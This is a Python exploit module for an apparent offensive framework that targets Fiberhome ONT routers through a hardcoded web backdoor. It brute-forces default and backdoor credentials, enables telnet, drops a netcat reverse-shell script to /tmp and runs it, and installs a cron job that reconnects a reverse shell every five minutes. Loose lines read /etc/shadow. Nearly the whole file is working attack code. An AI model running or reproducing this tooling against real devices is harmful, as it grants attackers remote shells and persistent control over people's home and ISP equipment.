#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Fiberhome AN5506/HG6245D Telnet Backdoor - Enhanced Detection
CVE-2021-3008 (Hardcoded Backdoor)
"""

import requests
import socket
import time
import urllib.parse
import re
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MODULE_INFO = {
    "name": "Fiberhome Telnet Backdoor - Enhanced Detection",
    "description": "Enable & Exploit Telnet backdoor with device detection and patch checking",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "CVE-2021-3008",
        "https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {
        "description": "HTTP protocol",
        "required": False, 
        "default": "http",
        "choices": ["http", "https"]
    },
    "USERNAME": {"description": "Backdoor username", "required": False, "default": "adminpldt"},
    "PASSWORD": {"description": "Backdoor password", "required": False, "default": "6GFJdY4aAuUKJjdtSn7dC2x"},
    "MODE": {
        "description": "Execution mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "enable", "connect", "upload", "persistence", "cleanup"]
    },
    "CMD": {"description": "Command (connect mode)", "required": False, "default": "id"},
    "LHOST": {"description": "Attacker IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Attacker port", "required": False, "default": "4444"},
    "TIMEOUT": {"description": "Request timeout (seconds)", "required": False, "default": "30"},
    "RETRY": {"description": "Number of retries", "required": False, "default": "3"},
    "BACKDOOR": {"description": "Local backdoor file", "required": False, "default": "./backdoor.sh"},
    "REMOTE_PATH": {"description": "Remote backdoor path", "required": False, "default": "/tmp/bd"},
    "CLEANUP": {"description": "Auto cleanup", "required": False, "default": "false"},
    "TELNET_PORT": {"description": "Telnet port after enable", "required": False, "default": "23"}
}

# ===================================================================
# PRESET CREDS
# ===================================================================
PRESET_CREDS = [
    ("adminpldt", "6GFJdY4aAuUKJjdtSn7dC2x"),
    ("gepon", "gepon"),
    ("rdsadmin", "adu#"),
    ("admin", "admin"),
    ("user", "user"),
    ("root", "root"),
    ("support", "support"),
]


# File system access
CMD="ls -la /"
CMD="cat /etc/shadow"
CMD="find / -name '*.cfg'"

# Network configuration  
CMD="ifconfig"
CMD="iptables -L"
CMD="netstat -tulpn"

# System information
CMD="uname -a"
CMD="cat /proc/version"
CMD="df -h"

# FiberHome device signatures
FIBERHOME_SIGNATURES = [
    "fiberhome",
    "fiber home", 
    "an5506",
    "hg6245d",
    "ont",
    "optical network terminal",
    "router web",
    "fh",
]

# Other common router brands (untuk detection)
OTHER_BRANDS = [
    "tplink", "tp-link", "linksys", "cisco", "d-link", "netgear",
    "asus", "huawei", "zte", "dasan", "nokia", "alcatel",
    "mikrotik", "ubiquiti", "edgecore", "bdcom"
]

BACKDOOR_SCRIPT = """#!/bin/sh
/bin/busybox nc {LHOST} {LPORT} -e /bin/sh 2>/dev/null || 
/bin/nc {LHOST} {LPORT} -e /bin/sh 2>/dev/null || 
/usr/bin/nc {LHOST} {LPORT} -e /bin/sh 2>/dev/null
"""

# ===================================================================
# DEVICE DETECTION CLASS
# ===================================================================
class DeviceDetector:
    def __init__(self, target, port=80, proto="http"):
        self.target = target
        self.port = port
        self.proto = proto
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
    def detect_device_type(self):
        """Detect if target is FiberHome device and check if patched"""
        console.print("\n[bold yellow]=== DEVICE DETECTION ===[/bold yellow]")
        
        device_info = {
            'is_fiberhome': False,
            'model': 'Unknown',
            'vulnerable': False,
            'patched': True,  # Assume patched until proven vulnerable
            'brand': 'Unknown',
            'details': {}
        }
        
        try:
            # Test basic connectivity
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            # Check for FiberHome signatures
            fiberhome_matches = []
            for signature in FIBERHOME_SIGNATURES:
                if signature in html_content:
                    fiberhome_matches.append(signature)
            
            if fiberhome_matches:
                device_info['is_fiberhome'] = True
                device_info['brand'] = 'FiberHome'
                console.print(f"[green]✓ FiberHome device detected (signatures: {', '.join(fiberhome_matches)})[/green]")
                
                # Try to extract model information
                model_patterns = [
                    r'an5506[^<>\"]*',
                    r'hg6245[^<>\"]*',
                    r'ont[^<>\"]*',
                    r'model[^<>\"]*',
                ]
                
                for pattern in model_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    if matches:
                        device_info['model'] = matches[0]
                        break
            else:
                # Check for other brands
                for brand in OTHER_BRANDS:
                    if brand in html_content:
                        device_info['brand'] = brand.title()
                        console.print(f"[yellow]! Device appears to be {brand.upper()}, not FiberHome[/yellow]")
                        return device_info
            
            # Test for vulnerability
            vuln_status = self.test_vulnerability()
            device_info['vulnerable'] = vuln_status['vulnerable']
            device_info['patched'] = not vuln_status['vulnerable']
            device_info['details'] = vuln_status
            
            return device_info
            
        except Exception as e:
            console.print(f"[red]✗ Device detection failed: {str(e)}[/red]")
            return device_info
    
    def test_vulnerability(self):
        """Test if device is vulnerable to CVE-2021-3008"""
        console.print("[bold yellow][*] Testing for CVE-2021-3008 vulnerability...[/bold yellow]")
        
        vuln_status = {
            'vulnerable': False,
            'backdoor_access': False,
            'telnet_enable': False,
            'issues': []
        }
        
        try:
            # Test backdoor endpoint
            backdoor_url = f"{self.base_url}/fh"
            console.print(f"[yellow][*] Testing backdoor endpoint: {backdoor_url}[/yellow]")
            
            # Test with multiple credentials
            working_creds = []
            for username, password in PRESET_CREDS:
                try:
                    data = {"username": username, "password": password}
                    r = self.session.post(backdoor_url, data=data, timeout=10)
                    
                    if r.status_code == 200:
                        working_creds.append((username, password))
                        vuln_status['backdoor_access'] = True
                        console.print(f"[green]✓ Backdoor accessible with {username}:{password}[/green]")
                        break
                    else:
                        console.print(f"[red]✗ Failed with {username}:{password} (HTTP {r.status_code})[/red]")
                except Exception as e:
                    console.print(f"[red]✗ Error testing {username}: {str(e)}[/red]")
            
            if vuln_status['backdoor_access']:
                # Test telnet enable endpoint
                telnet_url = f"{self.base_url}/telnet?Enable=0&key=BR0_MAC"
                console.print(f"[yellow][*] Testing telnet enable endpoint...[/yellow]")
                
                try:
                    r = self.session.get(telnet_url, timeout=10)
                    if r.status_code == 200:
                        vuln_status['telnet_enable'] = True
                        console.print("[green]✓ Telnet enable endpoint working[/green]")
                    else:
                        console.print(f"[yellow]! Telnet enable returned HTTP {r.status_code}[/yellow]")
                except Exception as e:
                    console.print(f"[red]✗ Telnet enable test failed: {str(e)}[/red]")
            
            # Determine overall vulnerability
            if vuln_status['backdoor_access'] and vuln_status['telnet_enable']:
                vuln_status['vulnerable'] = True
                console.print("[bold green]✓ DEVICE IS VULNERABLE to CVE-2021-3008[/bold green]")
            elif vuln_status['backdoor_access']:
                vuln_status['vulnerable'] = True
                console.print("[bold green]✓ DEVICE IS VULNERABLE (backdoor accessible)[/bold green]")
            else:
                console.print("[bold red]✗ DEVICE APPEARS PATCHED or NOT VULNERABLE[/bold red]")
                vuln_status['issues'].append("Backdoor endpoint not accessible with known credentials")
            
            return vuln_status
            
        except Exception as e:
            console.print(f"[red]✗ Vulnerability test failed: {str(e)}[/red]")
            vuln_status['issues'].append(f"Test error: {str(e)}")
            return vuln_status

# ===================================================================
# CUSTOM TELNET CLIENT
# ===================================================================
class CustomTelnetClient:
    def __init__(self, host, port=23, timeout=15):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            console.print(f"[bold green][+] Telnet connected to {self.host}:{self.port}[/bold green]")
            return True
        except Exception as e:
            console.print(f"[bold red][-] Telnet connection failed: {str(e)}[/bold red]")
            return False
            
    def read_until(self, delimiter, timeout=5):
        self.sock.settimeout(timeout)
        data = b""
        try:
            while delimiter not in data:
                chunk = self.sock.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data
    
    def read_all(self, timeout=3):
        self.sock.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data
    
    def write(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        self.sock.send(data)
        
    def execute(self, command, wait=3):
        self.write(command + "\n")
        time.sleep(wait)
        output = self.read_all().decode('utf-8', errors='ignore')
        return output
    
    def close(self):
        if self.sock:
            self.sock.close()

# ===================================================================
# EXPLOIT CLASS - WITH DETECTION
# ===================================================================
class FiberhomeTelnetBackdoor:
    def __init__(self, target, port=80, proto="http", username="adminpldt", password="6GFJdY4aAuUKJjdtSn7dC2x", timeout=30):
        self.target = target
        self.port = int(port)
        self.proto = proto
        self.username = username
        self.password = password
        self.timeout = timeout
        self.base_url = f"{proto}://{target}:{port}"
        
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
            
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        })
        self.tn = None

    def enable_telnet_backdoor(self):
        """Enable Telnet dengan handling 504 timeout"""
        max_retries = 3
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                console.print(f"[bold yellow][*] Attempt {attempt + 1}/{max_retries} to enable telnet...[/bold yellow]")
                
                # Backdoor authentication
                url = f"{self.base_url}/fh"
                data = {"username": self.username, "password": self.password}
                
                console.print(f"[bold yellow][*] Sending auth to {url}[/bold yellow]")
                
                # Gunakan timeout yang lebih panjang
                auth_response = self.session.post(url, data=data, timeout=self.timeout)
                
                if auth_response.status_code == 200:
                    console.print("[bold green][+] Backdoor auth successful![/bold green]")
                    
                    # Tunggu sebentar sebelum enable telnet
                    time.sleep(3)
                    
                    # Enable telnet service
                    enable_url = f"{self.base_url}/telnet?Enable=0&key=BR0_MAC"
                    console.print("[bold yellow][*] Enabling telnet service...[/bold yellow]")
                    
                    enable_response = self.session.get(enable_url, timeout=self.timeout)
                    
                    if enable_response.status_code == 200:
                        console.print("[bold green][+] Telnet enabled successfully![/bold green]")
                        return True
                    elif enable_response.status_code == 504:
                        console.print("[bold yellow][!] Got 504 but telnet might be enabled[/bold yellow]")
                        # 504 mungkin berarti proses sedang berjalan
                        return True
                    else:
                        console.print(f"[bold yellow][!] Telnet enable status: {enable_response.status_code}[/bold yellow]")
                        return True  # Assume success if auth worked
                        
                elif auth_response.status_code == 504:
                    console.print(f"[bold yellow][!] Got 504 on attempt {attempt + 1}, retrying...[/bold yellow]")
                    time.sleep(retry_delay)
                    continue
                else:
                    console.print(f"[bold red][-] Auth failed with status: {auth_response.status_code}[/bold red]")
                    return False
                    
            except requests.exceptions.Timeout:
                console.print(f"[bold yellow][!] Timeout on attempt {attempt + 1}, retrying...[/bold yellow]")
                time.sleep(retry_delay)
            except requests.exceptions.ConnectionError:
                console.print(f"[bold red][-] Connection error on attempt {attempt + 1}[/bold red]")
                return False
            except Exception as e:
                console.print(f"[bold red][-] Error on attempt {attempt + 1}: {str(e)}[/bold red]")
                time.sleep(retry_delay)
        
        console.print("[bold red][-] All attempts failed[/bold red]")
        return False

    def test_http_service(self):
        """Test service dengan timeout handling"""
        try:
            test_url = f"{self.base_url}/"
            r = self.session.get(test_url, timeout=10)
            console.print(f"[bold green][+] HTTP Service accessible (Status: {r.status_code})[/bold green]")
            return True
        except requests.exceptions.Timeout:
            console.print("[bold yellow][!] HTTP test timeout - service might be slow[/bold yellow]")
            return True  # Continue anyway
        except Exception as e:
            console.print(f"[bold red][-] HTTP Service error: {str(e)}[/bold red]")
            return False

    def connect_telnet(self, telnet_port=23):
        """Connect to telnet dengan multiple attempts"""
        max_attempts = 5
        for attempt in range(max_attempts):
            try:
                console.print(f"[bold yellow][*] Telnet connection attempt {attempt + 1}/{max_attempts}[/bold yellow]")
                
                self.tn = CustomTelnetClient(self.target, telnet_port, timeout=15)
                if not self.tn.connect():
                    time.sleep(3)
                    continue
                
                # Baca initial data
                initial_data = self.tn.read_all(timeout=5)
                
                # Try login dengan berbagai method
                if self._try_telnet_login(initial_data):
                    console.print("[bold green][+] Telnet login successful![/bold green]")
                    return True
                else:
                    console.print(f"[bold yellow][!] Login failed, retrying...[/bold yellow]")
                    self.tn.close()
                    time.sleep(3)
                    
            except Exception as e:
                console.print(f"[bold yellow][!] Telnet attempt {attempt + 1} failed: {str(e)}[/bold yellow]")
                time.sleep(3)
        
        console.print("[bold red][-] All telnet connection attempts failed[/bold red]")
        return False

    def _try_telnet_login(self, initial_data):
        """Coba multiple login methods"""
        login_methods = [
            ("gepon", "gepon"),
            ("admin", "admin"),
            ("root", "root"),
            ("", ""),  # Try no credentials
        ]
        
        for user, pwd in login_methods:
            try:
                console.print(f"[bold yellow][*] Trying login: {user}/{pwd}[/bold yellow]")
                
                if b"login:" in initial_data.lower() or b"username:" in initial_data.lower():
                    self.tn.write(user)
                    time.sleep(1)
                    
                    pass_data = self.tn.read_all(timeout=3)
                    if b"password:" in pass_data.lower():
                        self.tn.write(pwd)
                        time.sleep(2)
                
                # Check if login successful
                post_login = self.tn.read_all(timeout=3)
                if b"incorrect" not in post_login.lower() and b"fail" not in post_login.lower():
                    if b"#" in post_login or b"$" in post_login or b">" in post_login:
                        return True
                        
            except Exception as e:
                console.print(f"[bold yellow][!] Login attempt failed: {str(e)}[/bold yellow]")
                continue
                
        return False

    def execute(self, cmd):
        if not self.tn:
            return "No telnet connection"
        try:
            return self.tn.execute(cmd)
        except Exception as e:
            return f"Error: {str(e)}"

    def close(self):
        if self.tn:
            self.tn.close()

# ===================================================================
# MAIN RUN - WITH ENHANCED DETECTION
# ===================================================================
def run(session, options):
    show_info()

    current = {k: {**v, 'value': options.get(k, v.get('default'))} for k, v in OPTIONS.items()}
    show_options(current)

    # Extract parameters dengan default values
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http").lower()
    username = options.get("USERNAME", "adminpldt")
    password = options.get("PASSWORD", "6GFJdY4aAuUKJjdtSn7dC2x")
    mode = options.get("MODE", "detect").lower()
    cmd = options.get("CMD", "id")
    lhost = options.get("LHOST", "10.0.0.1")
    lport = options.get("LPORT", "4444")
    timeout = int(options.get("TIMEOUT", "30"))
    retry = int(options.get("RETRY", "3"))
    backdoor_file = options.get("BACKDOOR", "./backdoor.sh")
    remote_path = options.get("REMOTE_PATH", "/tmp/bd")
    cleanup = options.get("CLEANUP", "false").lower() == "true"
    telnet_port = options.get("TELNET_PORT", "23")

    console.print(f"\n[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")

    try:
        # Device detection first (for all modes except connect)
        if mode != "connect":
            detector = DeviceDetector(rhost, rport, proto)
            device_info = detector.detect_device_type()
            
            # Show detection results
            console.print("\n[bold yellow]=== DETECTION RESULTS ===[/bold yellow]")
            console.print(f"Device Type: {device_info['brand']}")
            console.print(f"Model: {device_info['model']}")
            console.print(f"FiberHome Device: {'Yes' if device_info['is_fiberhome'] else 'No'}")
            console.print(f"Vulnerable: {'Yes' if device_info['vulnerable'] else 'No'}")
            console.print(f"Patched: {'Yes' if device_info['patched'] else 'No'}")
            
            # Warn if not FiberHome or patched
            if not device_info['is_fiberhome']:
                console.print("\n[bold red]⚠️  WARNING: Target does not appear to be a FiberHome device![/bold red]")
                console.print("[yellow]This exploit is specifically for FiberHome ONT devices.[/yellow]")
                if mode != "detect":
                    console.print("[red]Aborting exploit attempt.[/red]")
                    return False
            
            if device_info['patched'] and mode != "detect":
                console.print("\n[bold red]⚠️  WARNING: Device appears to be PATCHED![/bold red]")
                console.print("[yellow]This device may have updated firmware that fixes CVE-2021-3008.[/yellow]")
                console.print("[yellow]Exploit will likely fail.[/yellow]")
                continue_exploit = input("\nContinue anyway? (y/N): ").lower().strip()
                if continue_exploit != 'y':
                    console.print("[yellow]Exploit aborted by user.[/yellow]")
                    return False

        # If just detection mode, stop here
        if mode == "detect":
            console.print("\n[bold green]✓ Detection completed[/bold green]")
            return True

        # Continue with exploit for other modes
        exploit = FiberhomeTelnetBackdoor(rhost, rport, proto, username, password, timeout)

        # Test service (toleransi timeout)
        console.print("[bold yellow][*] Testing web service...[/bold yellow]")
        if not exploit.test_http_service():
            console.print("[bold yellow][!] Service test failed but continuing...[/bold yellow]")

        if mode == "enable":
            if exploit.enable_telnet_backdoor():
                console.print("[bold green][+] Telnet should be enabled![/bold green]")
                console.print("[bold cyan][*] Wait 10-30 seconds then use MODE=connect[/bold cyan]")
                return True
            else:
                # Try all credentials
                console.print("[bold yellow][*] Trying all known credentials...[/bold yellow]")
                for cred_user, cred_pass in PRESET_CREDS:
                    if cred_user != username:
                        console.print(f"[bold yellow][*] Trying {cred_user}:{cred_pass}[/bold yellow]")
                        exploit = FiberhomeTelnetBackdoor(rhost, rport, proto, cred_user, cred_pass, timeout)
                        if exploit.enable_telnet_backdoor():
                            console.print(f"[bold green][+] Success with {cred_user}:{cred_pass}[/bold green]")
                            return True
                
                console.print("[bold red]✗ All credential attempts failed[/bold red]")
                console.print("[yellow]Possible reasons:[/yellow]")
                console.print("- Device is patched")
                console.print("- Custom ISP firmware")
                console.print("- Network restrictions")
                console.print("- Wrong target device")
                return False

        # Untuk mode lain, enable telnet dulu
        console.print("[bold yellow][*] Enabling telnet backdoor...[/bold yellow]")
        if not exploit.enable_telnet_backdoor():
            console.print("[bold red][-] Failed to enable telnet[/bold red]")
            console.print("[yellow]Device may be patched or not vulnerable.[/yellow]")
            return False

        console.print("[bold yellow][*] Waiting for telnet service to start...[/bold yellow]")
        time.sleep(10)  # Tunggu lebih lama

        if not exploit.connect_telnet(telnet_port):
            console.print("[bold red][-] Telnet connection failed[/bold red]")
            console.print("[yellow]Possible reasons:[/yellow]")
            console.print("- Telnet service not started")
            console.print("- Different telnet port")
            console.print("- Firewall blocking")
            console.print("- Login credentials changed")
            return False

        # Eksekusi berdasarkan mode
        if mode == "connect":
            result = exploit.execute(cmd)
            show_output(result)
        elif mode == "upload":
            # Simple upload method
            console.print("[bold yellow][*] Uploading backdoor...[/bold yellow]")
            exploit.execute(f"echo '{BACKDOOR_SCRIPT.format(LHOST=lhost, LPORT=lport)}' > {remote_path}")
            exploit.execute(f"chmod +x {remote_path}")
            exploit.execute(f"sh {remote_path} &")
            console.print(f"[bold green][+] Backdoor uploaded![/bold green]")
        elif mode == "persistence":
            exploit.execute(f"echo '*/5 * * * * nc {lhost} {lport} -e /bin/sh' >> /tmp/cron")
            exploit.execute("crontab /tmp/cron")
            console.print("[bold green][+] Persistence added![/bold green]")

        exploit.close()

        # Skip cleanup jika 504 masalah (default false)
        if cleanup:
            console.print("[bold yellow][*] Skip cleanup to avoid 504...[/bold yellow]")

        console.print("[bold green][+] Operation completed![/bold green]")
        return True

    except Exception as e:
        console.print(f"[bold red][-] Fatal error: {str(e)}[/bold red]")
        return False

# ===================================================================
# DISPLAY FUNCTIONS
# ===================================================================
def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("CVE", "2021-3008")
    table.add_row("Feature", "Device Detection + Patch Check")
    table.add_row("Risk", "High - Detection Only")
    console.print(Panel(table, title="FiberHome Exploit v2", border_style="red"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="green")
    table.add_column("Req", style="yellow")
    table.add_column("Desc", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        req = "yes" if v.get('required') else "no"
        table.add_row(k, str(val), req, v.get('description', ''))
    console.print(Panel(table, border_style="blue"))

def show_output(text):
    if text and text.strip():
        syntax = Syntax(text.strip(), "bash", theme="monokai", line_numbers=True)
        console.print(Panel(syntax, title="Output", border_style="green"))
